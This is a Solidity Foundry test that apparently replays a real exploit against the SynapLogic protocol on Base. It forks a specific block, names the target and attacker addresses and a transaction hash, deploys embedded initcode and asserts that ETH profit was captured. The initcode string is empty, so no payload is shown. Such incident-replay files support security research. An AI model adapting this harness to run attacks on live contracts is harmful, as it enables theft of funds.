pragma solidity ^0.8.10;

import "src/shared/BaseTest.sol";
import "src/shared/interfaces.sol";

/*
@Protocol: SynapLogic
@Date: 2026-01-19
@Attacker: 0x3Aa8bb3A19EECD229Cb33fbc03Ff549473e30F38
@Target: 0x39F36e2E58f36F7E5c17784847fd07Da1fEE1a32
@TxHash: 0xc54c00046364b6e889db18c73beee9b81df6b5ca822b6d262b3d30cdf376c4b1
@ChainId: 8453
@GasUsed: 1223958
*/

contract SynapLogicReplayPoC is BaseTest {
    // Replay input embedded in-file (no external tx_input.txt dependency).
    string internal constant REPLAY_INITCODE_HEX =
        "";

    receive() external payable {}

    function setUp() public {
        vm.createSelectFork("base", 41038633);
        target = 0x39F36e2E58f36F7E5c17784847fd07Da1fEE1a32;
    }

    function testReplayPoC() public balanceLog {
        bytes memory initCode = vm.parseBytes(REPLAY_INITCODE_HEX);
        address deployed;

        assembly {
            deployed := create(0, add(initCode, 0x20), mload(initCode))
        }

        assertTrue(deployed != address(0), "replay deployment failed");
        assertGt(address(this).balance, 0, "no ETH profit captured");
    }
}
